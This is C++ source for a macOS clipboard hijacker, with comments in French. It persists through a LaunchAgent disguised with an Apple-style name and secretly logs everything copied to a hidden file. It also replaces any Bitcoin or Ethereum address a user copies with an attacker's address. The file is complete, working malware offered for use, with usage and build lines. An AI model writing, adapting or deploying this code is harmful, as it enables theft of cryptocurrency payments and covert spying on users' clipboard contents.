// language: C++17, file: src/macos/04_clipboard_mac.cpp, target: macOS, clang
// Clipboard hijacker macOS - pbpaste (log) + pbcopy (remplacement adresses crypto)
// Usage: 04_clipboard <adresse_attaquant>
// Build: clang++ -O2 -std=c++17
#include <mach-o/dyld.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <pwd.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>

static std::string g_last;

static void Persist() {
    // LaunchAgent - relance a chaque session
    std::string dir = std::string(getpwuid(getuid())->pw_dir) + "/Library/LaunchAgents";
    mkdir(dir.c_str(), 0755);
    char self[MAXPATHLEN];
    uint32_t sz = sizeof(self);
    _NSGetExecutablePath(self, &sz);
    std::string plist = dir + "/com.apple.rickwidget.plist";
    FILE* f = fopen(plist.c_str(), "w");
    if (!f) return;
    fprintf(f,
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\"><dict>\n"
        "  <key>Label</key><string>com.apple.rickwidget</string>\n"
        "  <key>ProgramArguments</key><array><string>%s</string></array>\n"
        "  <key>RunAtLoad</key><true/>\n"
        "</dict></plist>\n", self);
    fclose(f);
}

static bool IsBtc(const char* s) {
    size_t n = strlen(s);
    if (n < 26 || n > 62) return false;
    if (s[0] == '1' || s[0] == '3') return n >= 26 && n <= 35;
    if (strncmp(s, "bc1", 3) == 0) return n >= 14 && n <= 62;
    return false;
}
static bool IsEth(const char* s) {
    size_t n = strlen(s);
    if (n != 42 || strncmp(s, "0x", 2)) return false;
    for (size_t i = 2; i < n; i++) {
        char c = s[i];
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'))) return false;
    }
    return true;
}

static void Log(const std::string& text) {
    std::string dir = std::string(getpwuid(getuid())->pw_dir)
                    + "/Library/Application Support/RickCache";
    mkdir(dir.c_str(), 0700);
    FILE* f = fopen((dir + "/.clip.log").c_str(), "a");
    if (f) { fprintf(f, "%s\n", text.c_str()); fclose(f); }
}

int main(int argc, char** argv) {
    daemon(0, 0);
    std::string atk = argc > 1 ? argv[1] : "bc1qdemoaddr0rickandmortyc137xxxxxxxxx";
    Persist();

    for (;;) {
        FILE* p = popen("pbpaste", "r");
        if (p) {
            std::string text;
            char buf[4096];
            size_t n;
            while ((n = fread(buf, 1, sizeof(buf), p)) > 0) text.append(buf, n);
            pclose(p);
            if (!text.empty() && text != g_last) {
                g_last = text;
                Log(text);
                if (IsBtc(text.c_str()) || IsEth(text.c_str())) {
                    FILE* q = popen("pbcopy", "w");
                    if (q) { fputs(atk.c_str(), q); pclose(q); }
                    g_last = atk;
                }
            }
        }
        usleep(400000);
    }
}
